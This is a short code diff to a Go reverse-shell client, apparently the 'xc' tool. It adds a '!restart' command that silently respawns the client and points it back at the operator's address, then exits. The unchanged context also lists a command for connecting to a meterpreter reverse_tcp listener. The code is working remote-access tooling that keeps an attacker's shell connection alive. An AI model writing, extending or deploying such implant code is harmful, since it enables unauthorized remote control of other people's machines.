@@ -10,7 +10,8 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
-
+	"time"
+	
 	"../meter"
 	"../plugins"
 	"../shell"
@@ -53,6 +54,8 @@ func usage() string {
 	usage += "   * restart xc with the specified user\n"
 	usage += "  !met <port>\n"
 	usage += "   * connects to a x64/meterpreter/reverse_tcp listener\n"
+	usage += "  !restart\n"
+	usage += "   * restarts the xc client\n"
 	usage += "└ OS Specific Commands:"
 	return usage
 }
@@ -250,6 +253,14 @@ func handleSharedCommand(s *yamux.Session, c net.Conn, argv []string, usage stri
 	case "!debug":
 		handled = true
 		fmt.Printf("Active Goroutines: %d\n", runtime.NumGoroutine())
+	case "!restart":
+		handled = true
+		ip, port := utils.SplitAddress(c.RemoteAddr().String())
+		cmd := fmt.Sprintf("%s %s %s\r\n", os.Args[0], ip, port)
+		go shell.ExecSilent(cmd, c)		
+		time.Sleep(1 * time.Second)
+		c.Close()
+		os.Exit(0)
 	}
 	return handled
 }
